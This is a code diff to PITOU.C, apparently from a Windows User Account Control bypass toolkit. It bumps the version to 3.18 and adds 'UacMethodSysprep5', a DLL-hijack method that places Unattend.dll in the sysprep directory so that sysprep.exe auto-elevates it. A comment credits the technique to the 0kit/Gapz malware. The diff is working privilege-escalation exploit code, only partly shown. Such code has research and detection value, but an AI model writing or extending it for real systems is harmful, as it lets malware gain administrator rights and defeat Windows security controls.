@@ -4,9 +4,9 @@
 *
 *  TITLE:       PITOU.C
 *
-*  VERSION:     3.17
+*  VERSION:     3.18
 *
-*  DATE:        18 Mar 2019
+*  DATE:        29 Mar 2019
 *
 *  Leo Davidson based IFileOperation auto-elevation.
 *
@@ -64,6 +64,10 @@ BOOL ucmSysprepMethodsCleanup(
 
         case UacMethodSysprep3:
             lpTarget = DBGCORE_DLL;
+            break;
+
+        case UacMethodSysprep5:
+            lpTarget = UNATTEND_DLL;
             break;
 
         case UacMethodTilon:
@@ -184,6 +188,7 @@ NTSTATUS ucmStandardAutoElevation2(
 * UacMethodSysprep2   - Windows 8.1 adapted UacMethodSysprep1 (bypassing sysprep embedded manifest dlls redirection).
 * UacMethodTilon      - Leo Davidson concept with different target dll, used by Win32/Tilon.
 * UacMethodSysprep3   - Windows 10 TH1 adapted UacMethodSysprep1.
+* UacMethodSysprep5   - Leo Davidson concept with different target dll, used by 0kit/Gapz.
 * UacMethodOobe       - WinNT/Pitou derivative from Leo Davidson concept.
 *
 */
@@ -264,6 +269,20 @@ NTSTATUS ucmStandardAutoElevation(
 
         //%temp%\ActionQueue.dll
         _strcat(szSourceDll, ACTIONQUEUE_DLL);
+
+        //%systemroot%\system32\sysprep
+        _strcat(szTargetDir, SYSPREP_DIR);
+
+        //%systemroot%\system32\sysprep\sysprep.exe
+        _strcat(szTargetProcess, SYSPREP_DIR);
+        _strcat(szTargetProcess, SYSPREP_EXE);
+
+        break;
+
+    case UacMethodSysprep5:
+
+        //%temp%\Unattend.dll
+        _strcat(szSourceDll, UNATTEND_DLL);
 
         //%systemroot%\system32\sysprep
         _strcat(szTargetDir, SYSPREP_DIR);
